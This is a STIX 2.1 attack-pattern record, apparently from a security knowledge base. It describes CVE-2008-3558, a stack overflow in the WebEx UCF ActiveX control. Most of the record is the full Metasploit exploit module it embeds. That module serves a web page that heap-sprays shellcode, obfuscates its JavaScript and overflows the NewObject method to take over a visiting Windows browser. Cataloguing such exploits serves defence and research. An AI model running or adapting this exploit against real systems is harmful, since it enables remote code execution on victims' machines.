{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6affca93-a60c-41d4-8897-98e31a667c12",
    "created": "2024-08-14T16:41:46.769265Z",
    "modified": "2024-08-14T16:41:46.769269Z",
    "name": "WebEx UCF atucfobj.dll ActiveX NewObject Method Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow in WebEx's WebexUCFObject ActiveX Control. If a long string is passed to the 'NewObject' method, a stack- based buffer overflow will occur when copying attacker-supplied data using the sprintf function.  It is noteworthy that this vulnerability was discovered and reported by multiple independent researchers. To quote iDefense's advisory, \"Before this issue was publicly reported, at least three independent security researchers had knowledge of this issue; thus, it is reasonable to believe that even more people were aware of this issue before disclosure.\"  NOTE: Due to input restrictions, this exploit uses a heap-spray to get the payload into memory unmodified.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/webex_ucf_newobject.rb",
            "external_id": "webex_ucf_newobject.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-3558"
        },
        {
            "source_name": "reference",
            "url": "http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=849"
        },
        {
            "source_name": "reference",
            "url": "http://www.trapkit.de/advisories/TKADV2008-009.txt"
        },
        {
            "source_name": "reference",
            "url": "http://tk-blog.blogspot.com/2008/09/vulnerability-rediscovery-xss-and-webex.html"
        },
        {
            "source_name": "reference",
            "url": "http://archives.neohapsis.com/archives/fulldisclosure/2008-08/0084.html"
        },
        {
            "source_name": "reference",
            "url": "http://www.cisco.com/en/US/products/products_security_advisory09186a00809e2006.shtml"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'WebEx UCF atucfobj.dll ActiveX NewObject Method Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow in WebEx's WebexUCFObject\n        ActiveX Control. If a long string is passed to the 'NewObject' method, a stack-\n        based buffer overflow will occur when copying attacker-supplied data using the\n        sprintf function.\n\n        It is noteworthy that this vulnerability was discovered and reported by multiple\n        independent researchers. To quote iDefense's advisory, \"Before this issue was\n        publicly reported, at least three independent security researchers had knowledge\n        of this issue; thus, it is reasonable to believe that even more people were aware\n        of this issue before disclosure.\"\n\n        NOTE: Due to input restrictions, this exploit uses a heap-spray to get the payload\n        into memory unmodified.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Tobias Klein',     # initial discoverer\n          'Elazar Broad',     # initial discoverer\n          'Guido Landi',      # milw0rm exploit\n          'jduck'             # metasploit version\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2008-3558' ],\n          [ 'OSVDB', '47344' ],\n          [ 'BID', '30578' ],\n          [ 'EDB', '6220' ],\n          [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=849' ],\n          [ 'URL', 'http://www.trapkit.de/advisories/TKADV2008-009.txt' ],\n          [ 'URL', 'http://tk-blog.blogspot.com/2008/09/vulnerability-rediscovery-xss-and-webex.html' ],\n          [ 'URL', 'http://archives.neohapsis.com/archives/fulldisclosure/2008-08/0084.html' ],\n          [ 'URL', 'http://www.cisco.com/en/US/products/products_security_advisory09186a00809e2006.shtml' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => \"\\x00\",\n          'DisableNops' => true\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # Tested with atucfobj.dll v20.2008.2601.4928\n          [ 'Windows Universal', { 'Ret' => 0x0c0c0c0c } ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2008-08-06'))\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n\n    # ActiveX parameters\n    progid = \"WebexUCFObject.WebexUCFObject\"\n    clsid = \"32E26FD9-F435-4A20-A561-35D4B987CFDC\"\n\n    # Set parameters\n    fnname = rand_text_alpha(8+rand(8))\n    offset = 232\n\n    # Build the exploit buffer\n    sploit = rand_text_alphanumeric(offset)\n    sploit << [target.ret - 0x20000].pack('V')\n\n    # Encode variables\n    sploit = Rex::Text.to_hex(sploit, '%')\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Prepare the heap spray parameters\n    spray_num = \"0x%x\" % target.ret\n\n    # Generate the final javascript\n    js = %Q|\nfunction #{fnname}()\n{\ntry {\nvar obj = new ActiveXObject(\"#{progid}\");\nvar my_unescape = unescape;\nvar shellcode = '#{shellcode}';\n#{js_heap_spray}\nsprayHeap(my_unescape(shellcode), #{spray_num}, 0x40000);\nvar sploit = my_unescape(\"#{sploit}\");\nobj.NewObject(sploit);\n} catch( e ) { window.location = 'about:blank' ; }\n}\n|\n\n    # Obfuscate the javascript\n    opts = {\n      'Strings' => true,\n      'Symbols' => {\n        'Variables' => %w{ obj my_unescape shellcode arg1 arg2 sploit }\n      }\n    }\n    js = ::Rex::Exploitation::ObfuscateJS.new(js, opts)\n    js.obfuscate(memory_sensitive: true)\n\n    # Build the final HTML\n    content = %Q|<html>\n<head>\n<script language=javascript>\n#{js}\n</script>\n</head>\n<body onload=\"#{fnname}()\">\nPlease wait...\n</body>\n</html>\n|\n\n    print_status(\"Sending #{self.name}\")\n\n    send_response_html(cli, content)\n\n    handler(cli)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-08-06",
    "x_mitre_platforms": [
        "win'"
    ]
}